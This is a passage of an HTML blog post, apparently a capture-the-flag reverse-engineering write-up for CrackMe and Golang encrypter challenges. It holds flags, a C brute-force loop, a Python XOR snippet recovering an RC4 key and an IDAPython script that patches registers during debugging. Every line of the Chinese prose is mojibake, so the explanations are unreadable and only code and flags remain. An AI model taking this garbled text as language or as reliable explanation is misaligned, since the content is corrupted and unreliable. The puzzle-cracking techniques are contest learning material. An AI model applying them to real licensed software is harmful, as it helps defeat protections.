Die</strong>ï¼Œå®ƒçš„å14ä½æ­£å¥½å’Œç¬¬ä¸€ä¸ªcheck()å‡½æ•°è¦æ»¡è¶³çš„ä¸€æ ·ï¼Œè€Œå®ƒçš„å‰7ä½å¯ä»¥è·³è¿‡çš„ï¼Œä¹Ÿæ­£å¥½æ»¡è¶³äº†è¿”å›å€¼è¦ä¸º7ã€‚</p><p>æ‰€ä»¥æœ€åçš„flagå°±æ˜¯ï¼š<strong>flag{Ninja Must Die}</strong></p><h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>ç¨‹åºåº”è¯¥æ˜¯realseæ¨¡å¼ç¼–è¯‘çš„ï¼Œä»£ç éƒ½æ‚åˆåˆ°ä¸€èµ·äº†ã€‚åšé¢˜æ—¶æ³¨æ„è¯†åˆ«å…³é”®ä»£ç ã€‚</p><p>æ¥åˆ°mainå‡½æ•°ï¼Œé¦–å…ˆå°±çœ‹åˆ°äº†è¾“å…¥å’Œé•¿åº¦åˆ¤æ–­ï¼Œæ˜æ˜¾çš„stlæ¨¡æ¿çš„stringç»“æ„ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403204000350.png" alt="image-20210403204000350"></p><p>åŠ¨è°ƒçœ‹ä¸€ä¸‹è¿™ä¸ªç»“æ„ï¼š</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403205021175.png" alt="image-20210403205021175"></p><p>åé¢ä¸€ç›´åˆ°ä¸‹ä¸€æ¬¡è¾“å…¥çš„çš„åœ°æ–¹ï¼ŒåŠ¨æ€åˆ†æä¸‹å¯ä»¥å¿«é€ŸçŸ¥é“æ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥å‰7ä½å’Œå10ä½åˆ†ä¸ºäº†2ä¸ªstringæ¥å­˜å‚¨ã€‚æ³¨æ„çœ‹å†…å­˜ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403205837005.png" alt="image-20210403205837005"></p><p>æ¥ä¸‹æ¥å…³é”®æ˜¯ç¬¬äºŒä¸ªè¾“å…¥åè¿›è¡Œæµ®ç‚¹æ•°è¿ç®—çš„åœ°æ–¹ï¼Œè¾“å…¥æ•°æ®ç»è¿‡æµ®ç‚¹è¿ç®—å¯¹æ¯”æ­£ç¡®åç»§ç»­è¿›è¡Œåé¢çš„åˆ†æ”¯ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403210353368.png" alt="image-20210403210353368"></p><p>æˆ‘å¼€å§‹ç›´æ¥è·³è¿‡äº†è¿™ä¸ªåˆ¤æ–­ï¼Œå…ˆçœ‹çœ‹åé¢åšäº†ä»€ä¹ˆã€‚</p><p>åˆ†æå¾—åˆ°ä¸‹é¢æ˜¯ç”¨è¾“å…¥çš„å‰7ä½å’Œç¬¬äºŒæ¬¡çš„è¾“å…¥å˜æ¢çš„å¾—åˆ°çš„æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œ</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403211320207.png" alt="image-20210403211320207"></p><p>ç»§ç»­çœ‹ä¸‹é¢ï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥çš„rc4ç»“æ„ï¼Œä¸”æŠŠæˆ‘ä»¬çš„å‰7ä½åšäº†keyï¼š</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403212129295.png" alt="image-20210403212129295"></p><p>åˆ°è¿™é‡Œå°±æ¸…æ¥šç¨‹åºçš„æ•´ä½“æµç¨‹äº†ã€‚</p><p>è¾“å…¥ä½17ä½ï¼Œå‰7ä½ä¸ºkeyï¼Œå10ä½ä¸ºæ˜æ–‡ã€‚ç¬¬äºŒæ¬¡è¾“å…¥ç»è¿‡æµ®ç‚¹è¿è¾“åï¼Œç»è¿‡åˆ¤æ–­ï¼Œæ­£ç¡®çš„è¯å°†å…¶ç»è¿‡æœ‰è§„å¾‹å˜æ¢åä¸ç¬¬ä¸€æ¬¡è¾“å…¥çš„å‰7ä½è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œç„¶åä¸ç¼–ç çš„encå¯¹æ¯”ï¼Œæ­£ç¡®çš„è¯ç»§ç»­åé¢çš„rc4åŠ å¯†ã€‚</p><p>æ‰€ä»¥ç°åœ¨å°±æ˜¯æ±‚å‡ºç¬¬äºŒæ¬¡è¾“å…¥ä¸€ä¸ªintæ•°æ®ã€‚</p><p>å¼€å§‹æƒ³çš„ç”¨angræ¥è·‘å±€éƒ¨ï¼Œä½†ä¸ç†Ÿç»ƒğŸ˜¢ï¼Œæ¢ç”¨å¤åˆ¶idaä¸­çš„ä»£ç åˆ°vsä¸­è¿è¡Œï¼Œçˆ†ç ´å‡ºè¿™ä¸ªintæ•°æ®ã€‚</p><p>æ³¨æ„ä¸€ä¸‹<strong>__m128</strong>è¿™ä¸ªå˜é‡ï¼š</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403232640041.png" alt="image-20210403232640041"></p><p>çˆ†ç ´ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__m128 __<span class="function">fastcall <span class="title">sub_7FF64A4E1360</span><span class="params">(<span class="keyword">double</span> a1, <span class="keyword">double</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> v2; <span class="comment">// xmm7_8</span></span><br><span class="line">    __m128 v3; <span class="comment">// xmm6</span></span><br><span class="line"></span><br><span class="line">    v2 = a1;</span><br><span class="line">    a1 = <span class="built_in">pow</span>(a1, a2 - <span class="number">1.0</span>);</span><br><span class="line">    *((<span class="keyword">double</span>*)&amp;v3 + <span class="number">1</span>) = *(&amp;a1 + <span class="number">1</span>);</span><br><span class="line">    *(<span class="keyword">double</span>*)&amp;v3 = a1 / <span class="built_in">exp</span>(v2);</span><br><span class="line">    <span class="keyword">return</span> (__m128)v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> v96 = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">double</span> v16 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v17 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v18 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v19;</span><br><span class="line">    <span class="keyword">int</span> v20;</span><br><span class="line">    <span class="keyword">double</span> v21, v22;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> v16 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v17 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v18 = <span class="number">0.0</span>;</span><br><span class="line">        v96 = i;</span><br><span class="line">        v19 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)v96 / <span class="number">12379</span>) + <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v17 = v17 + *(<span class="keyword">double</span>*)sub_7FF64A4E1360(v18, v19).m128_u64 * <span class="number">0.001</span>;</span><br><span class="line">            v18 = v18 + <span class="number">0.001</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (v18 &lt;= <span class="number">100.0</span>);</span><br><span class="line">        v20 = (<span class="keyword">int</span>)(v17 + v17 + <span class="number">3.0</span>);</span><br><span class="line">        v21 = <span class="number">0.0</span>;</span><br><span class="line">        v22 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)v96 % <span class="number">12379</span>) + <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v16 = v16 + *(<span class="keyword">double</span>*)sub_7FF64A4E1360(v21, v22).m128_u64 * <span class="number">0.001</span>;</span><br><span class="line">            v21 = v21 + <span class="number">0.001</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (v21 &lt;= <span class="number">100.0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">        <span class="keyword">if</span> (v20 == <span class="number">0x13B03</span> &amp;&amp; (<span class="keyword">int</span>)(v16 + v16 + <span class="number">3.0</span>) == <span class="number">0x5A2</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶ä¸æ˜¯å¾ˆå¿«ï¼Œä½†è¿˜æ˜¯è·‘å‡ºæ¥äº†ï¼š<strong>99038</strong></p><p>æ¥ä¸‹æ¥åŠ¨æ€å¾—åˆ°è¦ä¸ç¬¬ä¸€æ¬¡è¾“å…¥å‰7ä½è¿›è¡Œå¼‚æˆ–çš„æ•°æ®ã€‚å¼€å§‹æ˜¯99038ï¼Œåé¢éƒ½æ˜¯ä¹˜2åçš„å­—ç¬¦ä¸²ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403213606134.png" alt="image-20210403213606134"></p><p>è¿›è¡Œå¼‚æˆ–è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="number">57</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">57</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = [<span class="number">8</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">2</span>, <span class="number">64</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = [s[i]^t[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(ans)</span><br><span class="line"><span class="string">b'1ti5K3y'</span></span><br></pre></td></tr></table></figure><p>è¿™å°±å¾—åˆ°äº†keyã€‚</p><p>ç„¶åå°±æ˜¯è¿›è¡Œrc4è§£å¯†ï¼Œè¿™ä¸ªç›´æ¥åŠ¨è°ƒä¿®æ”¹è¾“å…¥æ•°æ®ä¸ºå¯†æ–‡æ•°æ®è¿›è¡Œä¸€æ¬¡åŠ å¯†å˜å¾—åˆ°æ˜æ–‡äº†ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403214259089.png" alt="image-20210403214259089"></p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403214337600.png" alt="image-20210403214337600"></p><p>æœ€åè¾“å…¥å¾—åˆ°flagï¼š<strong>flag{1ti5K3yRC4_crypt099038}</strong></p><p><strong>å†çœ‹é¢˜</strong></p><p>å› ä¸ºå½“æ—¶åšé¢˜æ—¶ï¼Œæ²¡æœ‰æ³¨æ„ç»†èŠ‚æˆ–è€…æ–¹æ³•ä»€ä¹ˆçš„ï¼Œå“ªé‡Œçˆ†ç ´çš„å¾ˆæ…¢ï¼Œç°åœ¨æ˜¯æˆ‘åé¢å¯¹è¿™ä¸ªé¢˜å†æ¬¡å­¦ä¹ å†™ä¸‹çš„ã€‚</p><p>é¦–å…ˆæ˜¯å¯¹__m128æ•°æ®ç±»å‹çš„é‡æ–°è®¤è¯†ï¼Œå®ƒæ˜¯ä¸€ä¸ªè”åˆï¼Œè¿™é‡Œå®ƒçš„æˆå‘˜ï¼š</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214224132.png" alt="image-20210419214224132"></p><p>æ‰€ä»¥é¢˜ç›®ä¸­çš„.m128_u64å°±æ˜¯å–ä½8å­—èŠ‚ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214254776.png" alt="image-20210419214254776"></p><p>exp()æ˜¯æ±‚eçš„æ¬¡æ–¹çš„å€¼ã€‚<strong>pow(a1, a2-1)/exp(a1)</strong></p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214354418.png" alt="image-20210419214354418"></p><p>å¦å¤–è¿™é‡Œæ˜¯é™¤12379ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”¨å•†ï¼Œç¬¬äºŒæ¬¡ç”¨ä½™æ•°ï¼Œæ‰€ä»¥è¿™é‡Œçˆ†ç ´çš„æ­¥é•¿åº”è¯¥æ˜¯æ¯æ¬¡åŠ 12379ï¼Œç¡®å®šäº†å•†ï¼Œå†ç¡®å®šä½™æ•°å°±å¾ˆå¿«äº†ã€‚ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214519931.png" alt="image-20210419214519931"></p><p>æ­£ç¡®çš„çˆ†ç ´è„šæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, ans;</span><br><span class="line"><span class="keyword">double</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i += <span class="number">12379</span>)</span><br><span class="line">&#123;</span><br><span class="line">a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">c = i/<span class="number">12379</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">a = a + (<span class="built_in">pow</span>(b, c)/<span class="built_in">exp</span>(b))*<span class="number">0.001</span>;</span><br><span class="line">b += <span class="number">0.001</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(b &lt;= <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">ans = (<span class="keyword">int</span>)(a+a+<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(ans == <span class="number">80643</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"found: %d\n\n"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">12379</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">c = i;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">a = a + (<span class="built_in">pow</span>(b, c)/<span class="built_in">exp</span>(b))*<span class="number">0.001</span>;</span><br><span class="line">b += <span class="number">0.001</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(b &lt;= <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">ans = (<span class="keyword">int</span>)(a+a+<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(ans == <span class="number">0x5A2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"found: %d\n"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶æ¬¡è¿˜æœ‰ä¸€ç§ç”¨ä½¿ç”¨idapythonæ¥çˆ†ç ´ï¼Œå®è´¨å°±æ˜¯è°ƒç”¨idaè°ƒè¯•å™¨ä¸­çš„å‡½æ•°æ¥æ§åˆ¶ç¨‹åºçš„æµç¨‹å’Œå¯„å­˜å™¨å€¼ç­‰ï¼Œä¸ºäº†è®©è‡ªå·±ç”¨çš„å‡½æ•°æœ‰ä¸€ä¸ªç»Ÿä¸€è§„èŒƒï¼Œæˆ‘ç»Ÿä¸€ä½¿ç”¨ida_dbgæ¨¡å—çš„å‡½æ•°ï¼ˆidapythonå°è£…è¿‡çš„å…¶å®ä¹Ÿä¸é”™ï¼‰ï¼šè¿è¡Œè„šæœ¬ç›´æ¥å¾—åˆ°ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">rsp = get_reg_val(<span class="string">"rsp"</span>)</span><br><span class="line">set_reg_val(<span class="string">"rip"</span>, <span class="number">0x140001768</span>)</span><br><span class="line">patch_qword(rsp+<span class="number">0x40</span>, i)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">run_to(<span class="number">0x140001658</span>)</span><br><span class="line">wait_for_next_event(WFNE_SUSP, <span class="number">-1</span>)</span><br><span class="line">init()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">print(<span class="string">"&gt;&gt;&gt; i: %d"</span>%i)</span><br><span class="line">run_to(<span class="number">0x14000184E</span>)</span><br><span class="line">wait_for_next_event(WFNE_SUSP, <span class="number">-1</span>)</span><br><span class="line">ebx = get_reg_val(<span class="string">"ebx"</span>)</span><br><span class="line">eax = get_reg_val(<span class="string">"eax"</span>)</span><br><span class="line"><span class="keyword">if</span> ebx != <span class="number">80643</span>:</span><br><span class="line">i += <span class="number">12379</span></span><br><span class="line">init()</span><br><span class="line"><span class="keyword">elif</span> eax != <span class="number">1442</span>:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">init()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"&gt;&gt;&gt; find: %d"</span>%i)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">exit_process()</span><br></pre></td></tr></table></figure><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419222558380.png" alt="image-20210419222558380"></p><p>æ„Ÿè§‰idapythoné‡Œé¢çš„å‡½æ•°çœŸçš„ç¹æ‚ã€‚ã€‚åŒä¸€ä¸ªåŠŸèƒ½å„ä¸ªæ¨¡å—éƒ½æœ‰ã€‚ä½†è‡ªå·±è¦æœ‰ä¸ªè§„èŒƒã€‚</p><p>è®°ä¸€ä¸ªidapythonæ–‡æ¡£ï¼Œéœ€è¦ä»€ä¹ˆéƒ½æœ‰ï¼Œç›´æ¥æŸ¥å°±å®Œäº‹äº†ï¼š<a href="https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/" target="_blank" rel="noopener">idapython_docs</a></p><h3 id="Golang-encrypter"><a href="#Golang-encrypter" class="headerlink" title="Golang encrypter"></a>Golang encrypter</h3><p>64ä½ï¼Œgoè¯­è¨€å†™çš„ç¨‹åºï¼Œç»è¿‡ç¬¦å·è¡¨è¿˜åŸåï¼Œè™½ç„¶ä»£ç è¿˜æ˜¯éš¾çœ‹ï¼Œä½†æœ‰äº†å¤§å¤šæ•°å‡½æ•°åç§°è¿˜æ˜¯å¥½å¾ˆå¤šçš„ã€‚</p><p>å¯¹è¾“å…¥çš„è¿›è¡Œçš„ç¬¬ä¸€ä¸ªæ£€æŸ¥å‡½æ•°ï¼šmain_check()ï¼Œé¦–å…ˆåˆ¤æ–­è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ï¼Œç„¶åå¼•å…¥ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹flagçš„æ ¼å¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œæœ€åæå–å‡ºæ¯éƒ¨åˆ†çš„å­—ç¬¦ä¸²è¿›è¡Œè¿æ¥ï¼Œæœ€åå†è¿›è¡Œä¸€ä¸ªhex()æ“ä½œã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403215520889.png" alt="image-20210403215520889"></p><p>åé¢å¼€å§‹ç”¨å¯†é’¥åˆå§‹åŒ–ä¸€ä¸ªå¯†é’¥å¯¹è±¡ï¼Œä»å¯†é’¥é•¿åº¦å¼€å§‹è¿˜æ˜¯ä»¥ä¸ºaesåŠ å¯†ï¼Œæµ‹è¯•åå‘ç°å¹¶ä¸æ˜¯ï¼Œï¼Œ</p><p>å…³é”®æ˜¯è¿™é‡Œçš„åŠ å¯†è¿˜æ˜¯8ä¸ªä¸€ç»„ï¼Œåˆ†2æ¬¡åŠ å¯†ï¼Œä¸”å¯†é’¥é•¿åº¦åˆæ˜¯16ï¼Œè¿™å°±æ’é™¤aeså’ŒdesåŠ å¯†äº†ã€‚</p><p>ç„¶åæ˜¯ä»myCipherå­—ç¬¦ä¸²è®©æˆ‘æƒ³åˆ°è¿™åº”è¯¥æ˜¯ä½œè€…è‡ªå·±å†™çš„ä¸€ä¸ªåŠ å¯†ï¼Œè¿›è€Œè¿›å…¥åŠ å¯†å‡½æ•°åˆ†æï¼š<br>é¦–å…ˆä»åŠ¨è°ƒåˆ†æçŸ¥é“ä¸‹é¢è¿™ä¸ªå‡½æ•°å°±æ˜¯äº¤æ¢æ•°æ®å­—èŠ‚é¡ºåºï¼Œ<strong>_byteswap_ulongï¼ˆï¼‰</strong>ï¼Œè¿™é‡Œå¼€å§‹è°ƒç”¨äº†2æ¬¡ï¼Œç»“æŸè°ƒç”¨äº†2æ¬¡è¿˜åŸã€‚åˆ†ä¸º2ç»„ï¼Œæ­£å¥½å–äº†8ä¸ªå­—èŠ‚ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403220950328.png" alt="image-20210403220950328"></p><p>æ¥ç€å°±æ˜¯å…³é”®åŠ å¯†æ¨¡æ¿äº†ï¼Œè¯´å®è¯ï¼Œéš¾çœ‹ï¼Œå…¶å®å°±æ˜¯é­”æ”¹çš„teaåŠ å¯†ï¼Œåˆ†ææ•°æ®æ—¶ç»†å¿ƒç‚¹ã€‚ã€‚</p><p><img 